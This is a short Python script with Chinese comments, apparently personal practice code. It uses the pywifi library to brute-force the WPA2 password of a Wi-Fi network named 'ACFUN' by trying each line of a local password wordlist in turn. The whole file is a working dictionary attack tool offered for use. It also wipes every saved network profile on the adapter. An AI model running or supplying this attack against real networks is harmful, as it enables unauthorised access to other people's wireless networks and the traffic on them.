import time
import pywifi
from pywifi import const  # 导入wifi模块的定义


def test_wifi_connect(password_str):
	wifi = pywifi.PyWiFi()  # 开启一个无线对象
	interface = wifi.interfaces()[0]  # 抓取无线网卡列表第一个无线网卡

	# print(interface.name())  # 取出无限网卡的名字

	interface.disconnect()  # 断开无线网卡链接
	time.sleep(3)  # 断开以后缓冲3秒

	profile = pywifi.Profile()  # 配置文件
	profile.ssid = "ACFUN"  # 就是wifi名称
	profile.auth = const.AUTH_ALG_OPEN  # 需要密码链接
	profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
	profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
	profile.key = password_str  # 测试密码成功或者失败

	interface.remove_all_network_profiles()  # 删除其他所有配置文件
	tmp_profile = interface.add_network_profile(profile)  # 加载配置文件

	interface.connect(tmp_profile)  # 链接
	time.sleep(5)  # 10秒内看是否可以链接上。
	isOK = False
	if interface.status() == const.IFACE_CONNECTED:
		isOK = True
		print("连接成功")
	else:
		print("连接失败")

	interface.disconnect()  # 断开连接
	time.sleep(1)
	return isOK


file_path = r"E:\Python练习代码\PythonFile\分类练习\code_破解WiFi\pass1.txt"
file = open(file_path, "r")
while True:
	line = file.readline()  # 第一步读取一行
	if not line:  # 密码为空，跳出循环
		break

	line = line[:-1]  # 去掉换行符
	if test_wifi_connect(line):
		print(line, " 密码正确")
		break
	else:
		print(line, " 密码错误")

file.close()


# str1 = '1234567'
# print(str1[:-1])  # 去掉最后一个字符
# print(str1[::-1])  # 逆序排列
